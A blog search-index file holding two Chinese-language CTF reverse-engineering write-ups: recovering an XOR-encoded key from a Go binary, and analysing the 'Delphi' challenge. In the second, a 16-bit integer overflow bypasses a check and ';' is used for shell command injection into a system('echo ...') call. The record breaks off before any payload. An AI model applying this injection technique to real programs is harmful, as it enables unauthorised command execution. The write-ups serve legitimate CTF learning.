{
    "docs": [
        {
            "location": "/", 
            "text": "Welcome to frozenkp's Blog", 
            "title": "HOME"
        }, 
        {
            "location": "/#welcome-to-frozenkps-blog", 
            "text": "", 
            "title": "Welcome to frozenkp's Blog"
        }, 
        {
            "location": "/Writeups/2014/NoConName_qual/inBINcible/", 
            "text": "inBINcible\n\n\n\n\nChallenge Link: Nope\n\n\nCategory: reverse\n\n\nWriteup: \ninBINcible\n\n\n\n\nGet the key. The flag is: \u201cNcN_\u201d + sha1sum(key)\n\n\ninbincible\n\n\n\u89c0\u5bdf\n\n\n\u9019\u652f\u7a0b\u5f0f\u57f7\u884c\u5f8c\u76f4\u63a5\u8f38\u51fa \nNope!\n \uff0c\u6c92\u6709\u4efb\u4f55\u8f38\u5165\n\n\n% ./inbincible                   \nNope!\n\n\n\n\n\u8d77\u624b\u5f0f\n\n\n\u9019\u500b\u57f7\u884c\u6a94\u662f 32 \u4f4d\u5143\u7684\uff0c\u4e14\u662f static link\n\n\n% file inbincible\ninbincible: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped\n\n\n\n\n\u767c\u73fe \nmain.main\n \u61c9\u8a72\u662f go \u7684\u57f7\u884c\u6a94\n\n\n% objdump -M intel -d inbincible\ninbincible\uff1a     \u6a94\u6848\u683c\u5f0f elf32-i386\n\n\nDisassembly of section .text:\n\n08048c00 \nmain.main\n:\n 8048c00:       65 8b 0d 00 00 00 00    mov    ecx,DWORD PTR gs:0x0\n 8048c07:       8b 89 f8 ff ff ff       mov    ecx,DWORD PTR [ecx-0x8]\n 8048c0d:       8d 44 24 c0             lea    eax,[esp-0x40]\n 8048c11:       3b 01                   cmp    eax,DWORD PTR [ecx]\n 8048c13:       77 0b                   ja     8048c20 \nmain.main+0x20\n\n 8048c15:       31 ff                   xor    edi,edi\n 8048c17:       31 c0                   xor    eax,eax\n ...\n\n\n\n\ngo \u8d77\u624b\u5f0f\n\n\n\u7e3d\u5171\u6709\u5169\u500b\u51fd\u5f0f\u5728 main package \u4e2d\n\n\n% go tool objdump inbincible | grep \nTEXT main\\.\n \nTEXT main.main(SB) /home/n/ctf/ncn_quals_2014/rev400/main.go\nTEXT main.func.001(SB) /home/n/ctf/ncn_quals_2014/rev400/main.go\nTEXT main.init(SB) /home/n/ctf/ncn_quals_2014/rev400/main.go\n\n\n\n\n\u5206\u6790 main\n\n\n\u904e\u7a0b\u4e2d\u767c\u73fe\u6709\u53d6\u51fa \nos.Args\n\uff0c\u53ef\u80fd\u662f\u85c9\u7531\u53c3\u6578\u8f38\u5165\n\n\n   0x8048ef1 \nmain.main+753\n:   cmp    DWORD PTR ds:0x814e17c,0x1\n   0x8048ef8 \nmain.main+760\n:   jbe    0x804937d \nmain.main+1917\n\n=\n 0x8048efe \nmain.main+766\n:   mov    ebx,DWORD PTR ds:0x814e178\n   0x8048f04 \nmain.main+772\n:   add    ebx,0x8\n   0x8048f07 \nmain.main+775\n:   mov    esi,DWORD PTR [ebx+0x4]\n\n\n\n\ngdb-peda$ x/10gx 0x814e178\n0x814e178 \nos.Args\n:    0x0000000218300000      0x0000000000000002\n0x814e188 \npersistent\n: 0xf7fc91a400000000      0x00000000f7ff9000\n0x814e198 \nreflect.dummy\n:      0x0000000000000000      0x0000000000000000\n0x814e1a8 \nsync.allPools\n:      0x000000000814e03c      0x0000000000000000\n0x814e1b8 \nsyscall.envs\n:       0x0000004e1830e000      0x000000000000004e\n\n\n\n\n\u63a5\u8457\u6bd4\u8f03 \nesi\n \u548c \nebp\n \uff0c\u6b64\u6642\u7684 \nebp\n \u662f\u56fa\u5b9a\u7684 \n0x10\n \uff0c\u800c \nesi\n \u662f\u53c3\u6578\u7684\u9577\u5ea6\n\n\n\u731c\u6e2c\u53c3\u6578\u9577\u5ea6\u61c9\u8a72\u8981\u662f \n0x10\n\n\n   0x8048f07 \nmain.main+775\n:   mov    esi,DWORD PTR [ebx+0x4]\n   0x8048f0a \nmain.main+778\n:   mov    ebx,DWORD PTR [esp+0x6c]\n   0x8048f0e \nmain.main+782\n:   mov    ebp,DWORD PTR [ebx+0x4]\n=\n 0x8048f11 \nmain.main+785\n:   cmp    esi,ebp\n   0x8048f13 \nmain.main+787\n:   je     0x8049048 \nmain.main+1096\n\n   0x8048f19 \nmain.main+793\n:   xor    ecx,ecx\n   0x8048f1b \nmain.main+795\n:   mov    ebp,DWORD PTR [esp+0x88]\n\n\n\n\n\u5206\u6790 func.001\n\n\n\u5728\u4e2d\u9593\u767c\u73fe reverse \u984c\u5e38\u898b\u7684 xor \uff0c\u76ee\u6a19\u662f \necx\n \u53ca \nebp\n \n\n\n\u6b64\u6642\u7684 \necx\n \u662f \n0x12\n \uff0c\nebp\n \u5247\u662f\u53c3\u6578\u7684\u7b2c\u4e00\u500b\u5b57\nx47 ( 'G' )\n\n\n0x8049456 \nmain.func+150\n:   xor    ecx,ebp\n\n\n\n\n\u63a5\u8457\u6bd4\u8f03\u4e86 \ncl\n \u53ca \nal\n\n\n\u6b64\u6642\u7684 \ncl\n \u662f xor \u7684\u7d50\u679c\uff0c\nal\n \u662f\u524d\u9762\u53d6\u51fa\u7684\u503c\n\n\n0x804946a \nmain.func+170\n:   cmp    cl,al\n\n\n\n\n\u5982\u679c\u5169\u8005\u4e00\u6a23\u7684\u8a71\uff0c\u6703\u900f\u904e go channel \u9001\u51fa 0x1 \u7d66 main\n\n\n\u731c\u6e2c\u53ef\u80fd\u662f\u53ea\u8981 16 \u500b\u5b57\u7d93\u904e xor \u4ee5\u5f8c\u90fd\u4e00\u6a23\u5c31\u53ef\u4ee5\u901a\u904e\u4e86\n\n\n\u89e3\u6cd5\n\n\n\u56e0\u70ba xor \u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u4e00\u6a23\u7684 key \u4f86\u627e\u5230\u539f\u59cb\u5b57\u4e32\uff0c\u6240\u4ee5\u53ea\u8981\u53d6\u51fa xor key \u4ee5\u53ca\u6700\u5f8c\u7684\u7b54\u6848\u5c31\u53ef\u4ee5\u4e86\n\n\nxor key\n\n\n\u5be6\u969b\u67e5\u770b\u8a72\u4f4d\u7f6e\u5f8c\u767c\u73fe key \u53ea\u6709 5 bytes \uff0c\u7d93\u904e\u6e2c\u8a66\u5f8c\u767c\u73fe\u9019 5 bytes \u6703\u4e00\u76f4\u5faa\u74b0\n\n\n\u4e5f\u5c31\u662f \n0x12, 0x45, 0x33, 0x87, 0x65, 0x12, 0x45, 0x33, 0x87, 0x65, 0x12, 0x45, 0x33, 0x87, 0x65, 0x12\n\n\ngdb-peda$ x/2gx 0x18300024-0x8\n0x1830001c:     0x4533876500000000      0x0000000000000012\n\n\n\n\nans\n\n\ngdb-peda$ x/2gx 0x18300040\n0x18300040:     0x0306330bb6447555      0x3344b247716002e9\n\n\n\n\nxor\n\n\n\u5c07\u5169\u500b\u5b57\u4e32\u7d93\u904e xor \u4ee5\u5f8c\u5c31\u53ef\u4ee5\u5f97\u5230\u539f\u5b57\u4e32 \nG0w1n!C0ngr4t5!!", 
            "title": "inBINcible"
        }, 
        {
            "location": "/Writeups/2014/NoConName_qual/inBINcible/#inbincible", 
            "text": "Challenge Link: Nope  Category: reverse  Writeup:  inBINcible   Get the key. The flag is: \u201cNcN_\u201d + sha1sum(key)  inbincible", 
            "title": "inBINcible"
        }, 
        {
            "location": "/Writeups/2014/NoConName_qual/inBINcible/#_1", 
            "text": "\u9019\u652f\u7a0b\u5f0f\u57f7\u884c\u5f8c\u76f4\u63a5\u8f38\u51fa  Nope!  \uff0c\u6c92\u6709\u4efb\u4f55\u8f38\u5165  % ./inbincible                   \nNope!", 
            "title": "\u89c0\u5bdf"
        }, 
        {
            "location": "/Writeups/2014/NoConName_qual/inBINcible/#_2", 
            "text": "\u9019\u500b\u57f7\u884c\u6a94\u662f 32 \u4f4d\u5143\u7684\uff0c\u4e14\u662f static link  % file inbincible\ninbincible: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped  \u767c\u73fe  main.main  \u61c9\u8a72\u662f go \u7684\u57f7\u884c\u6a94  % objdump -M intel -d inbincible\ninbincible\uff1a     \u6a94\u6848\u683c\u5f0f elf32-i386\n\n\nDisassembly of section .text:\n\n08048c00  main.main :\n 8048c00:       65 8b 0d 00 00 00 00    mov    ecx,DWORD PTR gs:0x0\n 8048c07:       8b 89 f8 ff ff ff       mov    ecx,DWORD PTR [ecx-0x8]\n 8048c0d:       8d 44 24 c0             lea    eax,[esp-0x40]\n 8048c11:       3b 01                   cmp    eax,DWORD PTR [ecx]\n 8048c13:       77 0b                   ja     8048c20  main.main+0x20 \n 8048c15:       31 ff                   xor    edi,edi\n 8048c17:       31 c0                   xor    eax,eax\n ...", 
            "title": "\u8d77\u624b\u5f0f"
        }, 
        {
            "location": "/Writeups/2014/NoConName_qual/inBINcible/#go", 
            "text": "\u7e3d\u5171\u6709\u5169\u500b\u51fd\u5f0f\u5728 main package \u4e2d  % go tool objdump inbincible | grep  TEXT main\\.  \nTEXT main.main(SB) /home/n/ctf/ncn_quals_2014/rev400/main.go\nTEXT main.func.001(SB) /home/n/ctf/ncn_quals_2014/rev400/main.go\nTEXT main.init(SB) /home/n/ctf/ncn_quals_2014/rev400/main.go", 
            "title": "go \u8d77\u624b\u5f0f"
        }, 
        {
            "location": "/Writeups/2014/NoConName_qual/inBINcible/#main", 
            "text": "\u904e\u7a0b\u4e2d\u767c\u73fe\u6709\u53d6\u51fa  os.Args \uff0c\u53ef\u80fd\u662f\u85c9\u7531\u53c3\u6578\u8f38\u5165     0x8048ef1  main.main+753 :   cmp    DWORD PTR ds:0x814e17c,0x1\n   0x8048ef8  main.main+760 :   jbe    0x804937d  main.main+1917 \n=  0x8048efe  main.main+766 :   mov    ebx,DWORD PTR ds:0x814e178\n   0x8048f04  main.main+772 :   add    ebx,0x8\n   0x8048f07  main.main+775 :   mov    esi,DWORD PTR [ebx+0x4]  gdb-peda$ x/10gx 0x814e178\n0x814e178  os.Args :    0x0000000218300000      0x0000000000000002\n0x814e188  persistent : 0xf7fc91a400000000      0x00000000f7ff9000\n0x814e198  reflect.dummy :      0x0000000000000000      0x0000000000000000\n0x814e1a8  sync.allPools :      0x000000000814e03c      0x0000000000000000\n0x814e1b8  syscall.envs :       0x0000004e1830e000      0x000000000000004e  \u63a5\u8457\u6bd4\u8f03  esi  \u548c  ebp  \uff0c\u6b64\u6642\u7684  ebp  \u662f\u56fa\u5b9a\u7684  0x10  \uff0c\u800c  esi  \u662f\u53c3\u6578\u7684\u9577\u5ea6  \u731c\u6e2c\u53c3\u6578\u9577\u5ea6\u61c9\u8a72\u8981\u662f  0x10     0x8048f07  main.main+775 :   mov    esi,DWORD PTR [ebx+0x4]\n   0x8048f0a  main.main+778 :   mov    ebx,DWORD PTR [esp+0x6c]\n   0x8048f0e  main.main+782 :   mov    ebp,DWORD PTR [ebx+0x4]\n=  0x8048f11  main.main+785 :   cmp    esi,ebp\n   0x8048f13  main.main+787 :   je     0x8049048  main.main+1096 \n   0x8048f19  main.main+793 :   xor    ecx,ecx\n   0x8048f1b  main.main+795 :   mov    ebp,DWORD PTR [esp+0x88]", 
            "title": "\u5206\u6790 main"
        }, 
        {
            "location": "/Writeups/2014/NoConName_qual/inBINcible/#func001", 
            "text": "\u5728\u4e2d\u9593\u767c\u73fe reverse \u984c\u5e38\u898b\u7684 xor \uff0c\u76ee\u6a19\u662f  ecx  \u53ca  ebp    \u6b64\u6642\u7684  ecx  \u662f  0x12  \uff0c ebp  \u5247\u662f\u53c3\u6578\u7684\u7b2c\u4e00\u500b\u5b57 x47 ( 'G' )  0x8049456  main.func+150 :   xor    ecx,ebp  \u63a5\u8457\u6bd4\u8f03\u4e86  cl  \u53ca  al  \u6b64\u6642\u7684  cl  \u662f xor \u7684\u7d50\u679c\uff0c al  \u662f\u524d\u9762\u53d6\u51fa\u7684\u503c  0x804946a  main.func+170 :   cmp    cl,al  \u5982\u679c\u5169\u8005\u4e00\u6a23\u7684\u8a71\uff0c\u6703\u900f\u904e go channel \u9001\u51fa 0x1 \u7d66 main  \u731c\u6e2c\u53ef\u80fd\u662f\u53ea\u8981 16 \u500b\u5b57\u7d93\u904e xor \u4ee5\u5f8c\u90fd\u4e00\u6a23\u5c31\u53ef\u4ee5\u901a\u904e\u4e86", 
            "title": "\u5206\u6790 func.001"
        }, 
        {
            "location": "/Writeups/2014/NoConName_qual/inBINcible/#_3", 
            "text": "\u56e0\u70ba xor \u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u4e00\u6a23\u7684 key \u4f86\u627e\u5230\u539f\u59cb\u5b57\u4e32\uff0c\u6240\u4ee5\u53ea\u8981\u53d6\u51fa xor key \u4ee5\u53ca\u6700\u5f8c\u7684\u7b54\u6848\u5c31\u53ef\u4ee5\u4e86", 
            "title": "\u89e3\u6cd5"
        }, 
        {
            "location": "/Writeups/2014/NoConName_qual/inBINcible/#xor-key", 
            "text": "\u5be6\u969b\u67e5\u770b\u8a72\u4f4d\u7f6e\u5f8c\u767c\u73fe key \u53ea\u6709 5 bytes \uff0c\u7d93\u904e\u6e2c\u8a66\u5f8c\u767c\u73fe\u9019 5 bytes \u6703\u4e00\u76f4\u5faa\u74b0  \u4e5f\u5c31\u662f  0x12, 0x45, 0x33, 0x87, 0x65, 0x12, 0x45, 0x33, 0x87, 0x65, 0x12, 0x45, 0x33, 0x87, 0x65, 0x12  gdb-peda$ x/2gx 0x18300024-0x8\n0x1830001c:     0x4533876500000000      0x0000000000000012", 
            "title": "xor key"
        }, 
        {
            "location": "/Writeups/2014/NoConName_qual/inBINcible/#ans", 
            "text": "gdb-peda$ x/2gx 0x18300040\n0x18300040:     0x0306330bb6447555      0x3344b247716002e9", 
            "title": "ans"
        }, 
        {
            "location": "/Writeups/2014/NoConName_qual/inBINcible/#xor", 
            "text": "\u5c07\u5169\u500b\u5b57\u4e32\u7d93\u904e xor \u4ee5\u5f8c\u5c31\u53ef\u4ee5\u5f97\u5230\u539f\u5b57\u4e32  G0w1n!C0ngr4t5!!", 
            "title": "xor"
        }, 
        {
            "location": "/Writeups/2015/B-Sides_Vancouver/Delphi/", 
            "text": "Delphi\n\n\n\n\nChallenge link: Nope\n\n\nCategory: reverse\n\n\nWriteup: \nDelphi\n\n\n\n\ndelphi\n\n\nlibtwenty.so\n\n\nObservation\n\n\n\u56e0\u70ba\u6709\u984d\u5916\u7d66\u7684 Library \uff0c\u6240\u4ee5\u8981\u57f7\u884c(\u5206\u6790)\u7684\u6642\u5019\u8981\u642d\u914d \nLD_LIBRARY_PATH=.\n \u5c07\u7576\u524d\u8cc7\u6599\u593e\u6307\u5b9a\u7d66 Library \u8def\u5f91\n\n\n$ \nLD_LIBRARY_PATH\n=\n. ./delphi \nWelcome!\n\nAre you ready to play \n20\n questions? No? Perfect!\nI\nm thinking of something big, metal, and orange. Go!\n\n\n test\n\n\nWho\ns that?\n\n deadbeef\nWho\ns that?\n\n\n\n\n\n\nfile\n\n\n$ file ./delphi \n./delphi: ELF \n64\n-bit LSB executable, x86-64, version \n1\n \n(\nSYSV\n)\n, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, \nfor\n GNU/Linux \n2\n.6.32, BuildID\n[\nsha1\n]=\n70886b932f383987896e371d422ab8a4089bd148, not stripped\n\n\n\n\ngo binary\n\n\nObjdump \u5f8c\u767c\u73fe \nmain.main\n \uff0c\u662f go \u7684 binary \u6a94\uff0c\u5176\u4e2d\u5728 main package \u4e2d\u6709\u5169\u500b\u6bd4\u8f03\u7279\u5225\u7684 function\n\n\n\n\nmain.doTheMagic\n\n\nmain._Cfunc_check_answer (cgo \u7684 function)\n\n\n\n\n$ objdump -d delphi \n|\n grep \n.*main.*\n:\n\n0000000000400df0 \n__libc_start_main@plt\n:\n\n0000000000401280\n \nmain.main\n:\n0000000000401c30 \nmain.doTheMagic\n:\n0000000000401df0 \nmain.init\n:\n00000000004021c0 \nmain._Cfunc_CString\n:\n\n0000000000402230\n \nmain._Cfunc_check_answer\n:\n\n0000000000402270\n \nmain._Cfunc_free\n:\n0000000000411b20 \nruntime.main\n:\n00000000004295b0 \nmain\n:\n\n\n\n\nSolution\n\n\nInput\n\n\n\u4e00\u958b\u59cb\u5148\u627e\u770b\u770b\u8f38\u5165\u7684\u5730\u65b9\n\n\n$ go tool objdump delphi \n|\n grep \n.*main\\.go.*Scan\n\n        main.go:34      0x4016ee        bd30b74f00                      MOVL \n$bufio\n.ScanLines.f\n(\nSB\n)\n, BP\n        main.go:35      0x401755        e816b80200                      CALL bufio.\n(\n*Scanner\n)\n.Scan\n(\nSB\n)\n\n\n\n\n\n   0x401747 \nmain.main+1223\n:   mov    QWORD PTR \n[\nrsp+0x48\n]\n,rax\n   0x40174c \nmain.main+1228\n:   mov    rbx,QWORD PTR \n[\nrsp+0x48\n]\n\n   0x401751 \nmain.main+1233\n:   mov    QWORD PTR \n[\nrsp\n]\n,rbx\n\n=\n 0x401755 \nmain.main+1237\n:   call   0x42cf70 \nbufio.\n(\n*Scanner\n)\n.Scan\n\n   0x40175a \nmain.main+1242\n:   movzx  rbx,BYTE PTR \n[\nrsp+0x8\n]\n\n   0x401760 \nmain.main+1248\n:   cmp    bl,0x0\n   0x401763 \nmain.main+1251\n:   je     0x4018b1 \nmain.main+1585\n\n   0x401769 \nmain.main+1257\n:   mov    rdi,QWORD PTR \n[\nrsp+0x48\n]\n\nGuessed arguments:\narg\n[\n0\n]\n: 0xc208028130 --\n 0x0 \narg\n[\n1\n]\n: 0x7ffff7e20df0 --\n 0xc208020000 --\n 0x0 \n\n\n\n\n\u8f38\u5165 deadbeef \u5f8c\u7e7c\u7e8c\u89c0\u5bdf\n\n\n\u767c\u73fe\u5f8c\u9762\u51fa\u73fe\u4e00\u6bb5\u6709\u8da3\u7684\u6bd4\u8f03\uff0c\u6b64\u6642\u7684 \nrdx\n \u662f\u8f38\u5165\u7684\u9577\u5ea6\uff0c\nrax\n \u662f 'go' \u7684\u9577\u5ea6\n\n\n\u7531\u5e95\u4e0b \njl\n \u548c \njb\n \u53ef\u77e5 \n\u8f38\u5165\u4e0d\u80fd\u5c0f\u65bc 2 \n\n\nRAX: 0x2 \nRBX: 0x4d7f60 --\n 0x4d7f70 --\n 0x6f67 \n(\ngo\n)\n\nRCX: 0x66656562 \n(\nbeef\n)\n\nRDX: 0x8 \nRSI: 0x4d7f70 --\n 0x6f67 \n(\ngo\n)\n\nRDI: 0xc208000260 \n(\ndeadbeef\n)\n\nRBP: 0x7ffff7fb3000 --\n 0x781d28 \n(\n0x00007ffff7fb3000\n)\n\nRSP: 0x7ffff7e20dc0 --\n 0xc208013000 \n(\ndeadbeef\\n\n)\n\n\n[\n-------------------------------------code-------------------------------------\n]\n\n   0x401939 \nmain.main+1721\n:   mov    rax,QWORD PTR \n[\nrbx+0x8\n]\n\n   0x40193d \nmain.main+1725\n:   mov    QWORD PTR \n[\nrsp+0x90\n]\n,rdx\n   0x401945 \nmain.main+1733\n:   mov    QWORD PTR \n[\nrsp+0xb0\n]\n,rax\n\n=\n 0x40194d \nmain.main+1741\n:   cmp    rdx,rax\n   0x401950 \nmain.main+1744\n:   jl     0x401baa \nmain.main+2346\n\n   0x401956 \nmain.main+1750\n:   cmp    rdx,rax\n   0x401959 \nmain.main+1753\n:   jb     0x401bb2 \nmain.main+2354\n\n   0x40195f \nmain.main+1759\n:   mov    QWORD PTR \n[\nrsp+0xb8\n]\n,rdi\n\n\n\n\n\u518d\u5f80\u4e0b\u770b\uff0c\u51fa\u73fe\u4e86 \nruntime.eqstring\n \n\n\n\u6bd4\u8f03\u7684\u76ee\u6a19\u662f \u8f38\u5165 ( 'deadbeef' ) \u4ee5\u53ca 'go' \u7684\u524d\u5169\u500b byte (0x2)\n\n\n   0x401986 \nmain.main+1798\n:   mov    QWORD PTR \n[\nrsp+0x18\n]\n,rax\n\n=\n 0x40198b \nmain.main+1803\n:   call   0x425600 \nruntime.eqstring\n\n   0x401990 \nmain.main+1808\n:   movzx  rbx,BYTE PTR \n[\nrsp+0x20\n]\n\n\n[\n------------------------------------stack-------------------------------------\n]\n\n\n0000\n|\n 0x7ffff7e20dc0 --\n 0xc208000260 \n(\ndeadbeef\n)\n\n\n0008\n|\n 0x7ffff7e20dc8 --\n 0x2 \n\n0016\n|\n 0x7ffff7e20dd0 --\n 0x4d7f70 --\n 0x6f67 \n(\ngo\n)\n\n\n0024\n|\n 0x7ffff7e20dd8 --\n 0x2\n\n\n\n\n\u5be6\u969b\u6e2c\u8a66\u4e00\u4e0b\uff0c\u679c\u7136\u8f38\u5165\u958b\u982d\u662f go \u7684\u8a71\u5c31\u6703\u51fa\u73fe\u4e0d\u4e00\u6a23\u7684\u7d50\u679c\n\n\nLD_LIBRARY_PATH\n=\n. ./delphi \nWelcome!\n\nAre you ready to play \n20\n questions? No? Perfect!\nI\nm thinking of something big, metal, and orange. Go!\n\n\n goabcd\n\n\nSneaky, sneaky. Go where? How fast?\n\n\n go\n\n\nSneaky, sneaky. Go where? How fast?\n\n\n abcd\n\n\nWho\ns that?\n\n \n\n\n\n\n\u6bd4\u5c0d\u6b63\u78ba\u5f8c\u5c31\u6703\u9032\u5165 \nmain.doTheMagic\n \u4e86\n\n\n   0x401a0d \nmain.main+1933\n:   mov    QWORD PTR \n[\nrsp+0x8\n]\n,rax\n\n=\n 0x401a12 \nmain.main+1938\n:   call   0x401c30 \nmain.doTheMagic\n\n   0x401a17 \nmain.main+1943\n:   lea    rbx,ds:0x4d4060\n\n\n\n\ndoTheMagic\n\n\n\u7e7c\u7e8c\u5f80\u4e0b\u770b\uff0c\u767c\u73fe \nstrings.Split\n \uff0c\u4ee5\u7a7a\u683c( ' ' )\u4f5c\u70ba\u5207\u5272\u9ede\n\n\n\u7e7c\u7e8c\u57f7\u884c\u5f8c\u5c31\u7d50\u675f\u4e86\n\n\n   0x401c77 \nmain.doTheMagic+71\n:       mov    rdi,rbp\n   0x401c7a \nmain.doTheMagic+74\n:       movs   QWORD PTR es:\n[\nrdi\n]\n,QWORD PTR ds:\n[\nrsi\n]\n\n   0x401c7c \nmain.doTheMagic+76\n:       movs   QWORD PTR es:\n[\nrdi\n]\n,QWORD PTR ds:\n[\nrsi\n]\n\n\n=\n 0x401c7e \nmain.doTheMagic+78\n:       call   0x44a480 \nstrings.Split\n\n   0x401c83 \nmain.doTheMagic+83\n:       mov    rdx,QWORD PTR \n[\nrsp+0x20\n]\n\n   0x401c88 \nmain.doTheMagic+88\n:       mov    rax,QWORD PTR \n[\nrsp+0x28\n]\n\n   0x401c8d \nmain.doTheMagic+93\n:       mov    rcx,QWORD PTR \n[\nrsp+0x30\n]\n\n   0x401c92 \nmain.doTheMagic+98\n:       mov    QWORD PTR \n[\nrsp+0x68\n]\n,rdx\nGuessed arguments:\narg\n[\n0\n]\n: 0x7ffff7e20d40 --\n 0x8 \narg\n[\n1\n]\n: 0x4d37d0 --\n 0x20 \n(\n \n)\n\n\n\n\n\n\u53e6\u5916\u5728\u5f8c\u9762\u53ef\u4ee5\u627e\u5230 \nmain._Cfunc_check_answer\n\n\n401dbf:       e8 6c \n04\n \n00\n \n00\n          callq  \n402230\n \nmain._Cfunc_check_answer\n\n\n\n\n\n\u6211\u731c\u53ef\u80fd\u8f38\u5165\u8981\u7528\u7a7a\u683c\u5206\u6210\u597d\u5e7e\u6bb5\uff0c\u56e0\u6b64\u6211\u5728 \nmain._Cfunc_check_answer\n \u8a2d\u65b7\u9ede\uff0c\u4e26\u586b\u5165\u4e0d\u540c\u6578\u76ee\u7684\u8f38\u5165\u6e2c\u8a66\uff0c\u6700\u5f8c\u767c\u73fe\u9700\u8981\u8f38\u5165\u5171\u4e09\u6bb5\u5c31\u6703\u7d93\u904e\u65b7\u9ede\uff0c\u8f38\u5165\u683c\u5f0f\u5982\u4e0b\n\n\ngo \nsomething\n \nsomething\n\n\n\n\n\ncheck_answer\n\n\n\u5f80\u4e0b\u770b\u767c\u73fe\u4ed6\u5229\u7528 \ncgocall\n \u547c\u53eb\u4e86 \n0x400f80\n\n\n=\n 0x402249 \nmain._Cfunc_check_answer+25\n:      mov    eax,0x400f80\n   0x40224e \nmain._Cfunc_check_answer+30\n:      mov    QWORD PTR \n[\nrsp\n]\n,rax\n   0x402252 \nmain._Cfunc_check_answer+34\n:      lea    rax,\n[\nrsp+0x18\n]\n\n   0x402257 \nmain._Cfunc_check_answer+39\n:      mov    QWORD PTR \n[\nrsp+0x8\n]\n,rax\n   0x40225c \nmain._Cfunc_check_answer+44\n:      call   0x404da0 \nruntime.cgocall\n\n\n\n\n\ngdb-peda$ x/5gi 0x400f80\n   0x400f80 \n_cgo_de3376964270_Cfunc_check_answer\n:     mov    rsi,QWORD PTR \n[\nrdi+0x8\n]\n\n   0x400f84 \n_cgo_de3376964270_Cfunc_check_answer+4\n:   mov    edi,DWORD PTR \n[\nrdi\n]\n\n   0x400f86 \n_cgo_de3376964270_Cfunc_check_answer+6\n:   jmp    0x400de0 \ncheck_answer@plt\n\n   0x400f8b:    nop    DWORD PTR \n[\nrax+rax*1+0x0\n]\n\n   0x400f90 \n_cgo_de3376964270_Cfunc_free\n:     mov    rdi,QWORD PTR \n[\nrdi\n]\n\n\n\n\n\n\u8981\u8ffd\u9032\u53bb\u7684\u8a71\uff0c\u5efa\u8b70\u662f\u5728 \n0x400f80\n \u8a2d\u65b7\u9ede\uff0c\u63a5\u8457 continue \u904e\u53bb\uff0c\u907f\u514d\u4e2d\u9014\u6c92\u8ddf\u5230\n\n\n\u6700\u5f8c\u6703\u56de\u5230 check_answer\n\n\n=\n 0x7ffff7bd5758 \ncheck_answer\n:       push   rbp\n   0x7ffff7bd5759 \ncheck_answer+1\n:     mov    rbp,rsp\n   0x7ffff7bd575c \ncheck_answer+4\n:     sub    rsp,0xa0\n   0x7ffff7bd5763 \ncheck_answer+11\n:    mov    DWORD PTR \n[\nrbp-0x94\n]\n,edi\n   0x7ffff7bd5769 \ncheck_answer+17\n:    mov    QWORD PTR \n[\nrbp-0xa0\n]\n,rsi\n\n\n\n\n\u5f80\u4e0b\u8ffd\u6703\u51fa\u73fe\u4e00\u500b\u6709\u8da3\u7684\u6771\u897f\n\n\n\u6b64\u6642\u7684 \neax\n \u662f\u6700\u5f8c\u4e00\u6bb5\u8f38\u5165\u7684\u503c\uff0c\u56e0\u70ba\u6211\u8f38\u5165\u7684\u662f \ngo abc def\n \uff0c\u6240\u4ee5\u9019\u908a\u7684 eax \u56e0\u7232\u8f49\u4e0d\u51fa\u4f86\u6240\u4ee5\u8b8a\u6210 0\n\n\nadd \u5f8c\u8b8a\u6210 42\uff0c\u7531\u6b64\u53ef\u77e5 [rbp-0x2] \u539f\u59cb\u503c\u61c9\u8a72\u662f 42\n\n\n   0x7ffff7bd5789 \ncheck_answer+49\n:    mov    eax,DWORD PTR \n[\nrbp-0x94\n]\n\n\n=\n 0x7ffff7bd578f \ncheck_answer+55\n:    add    WORD PTR \n[\nrbp-0x2\n]\n,ax\n   0x7ffff7bd5793 \ncheck_answer+59\n:    movzx  eax,WORD PTR \n[\nrbp-0x2\n]\n\n   0x7ffff7bd5797 \ncheck_answer+63\n:    cmp    eax,0x4\n   0x7ffff7bd579a \ncheck_answer+66\n:    ja     0x7ffff7bd57ed \ncheck_answer+149\n\n\n\n\n\n\u5982\u679c\u6bd4\u8f03\u7b26\u5408\u5f8c\u8df3\u904e\u53bb\uff0c\u6703\u51fa\u73fe \nstrcat\n \u4ee5\u53ca \nsystem\n \n\n\n\u5728 stack \u4e2d\u53ef\u4ee5\u770b\u5230 \u2019echo' \u4ee5\u53ca\u7b2c\u4e8c\u6bb5\u8f38\u5165 'abc' \uff0c\u770b\u4f86\u662f\u5408\u6210 'echo abc' \u4ee5\u5f8c\u5229\u7528 system \u57f7\u884c\n\n\n=\n 0x7ffff7bd57d7 \ncheck_answer+127\n:   call   0x7ffff7bd5650 \nstrcat@plt\n\n   0x7ffff7bd57dc \ncheck_answer+132\n:   lea    rax,\n[\nrbp-0x90\n]\n\n   0x7ffff7bd57e3 \ncheck_answer+139\n:   mov    rdi,rax\n   0x7ffff7bd57e6 \ncheck_answer+142\n:   call   0x7ffff7bd5630 \nsystem@plt\n\n\n[\n------------------------------------stack-------------------------------------\n]\n\n\n0000\n|\n 0x7fffffffe4f0 --\n 0x788170 --\n 0x636261 \n(\nabc\n)\n\n\n0008\n|\n 0x7fffffffe4f8 --\n 0x0 \n\n0016\n|\n 0x7fffffffe500 --\n 0x206f686365 \n(\necho \n)\n\n\n\n\n\n\u7d9c\u5408\u4e0a\u8ff0\uff0c\u6211\u5011\u61c9\u8a72\u8981\u4f7f 42 + {number} \n= 4\n\n\n\u9019\u88e1\u6709\u500b\u6709\u8da3\u7684\u5730\u65b9\uff0c\u4ed6\u5728\u53d6\u503c\u7684\u6642\u5019\u662f\u4f7f\u7528 WORD (2 bytes) \u4f86\u53d6\uff0c\u7576\u9019\u88e1\u7684\u503c\u8d85\u904e WORD \u4e0a\u9650\u6642\u5c31\u6703\u6b78\u96f6\uff0c\u6211\u5011\u53ef\u4ee5\u5229\u7528\u9019\u500b\u9ede\u4f86\u9054\u6210\u4e0a\u8ff0\u7684\u689d\u4ef6\n\n\nnumber = 2^16 - 42 + eax\n\n\n\n\ncommand injection\n\n\n\u524d\u9762\u6709\u770b\u5230\u7d44\u5408\u7684 'echo abc' \uff0c\u6b64\u6642\u53ef\u4ee5\u5229\u7528 \n;\n \u4f86\u9032\u884c command injection \u4f86\u62ff\u5230 shell\n\n\n$ \nLD_LIBRARY_PATH\n=\n. ./delphi \nWelcome!\n\nAre you ready to play \n20\n questions? No? Perfect!\nI\nm thinking of something big, metal, and orange. Go!\n\n go 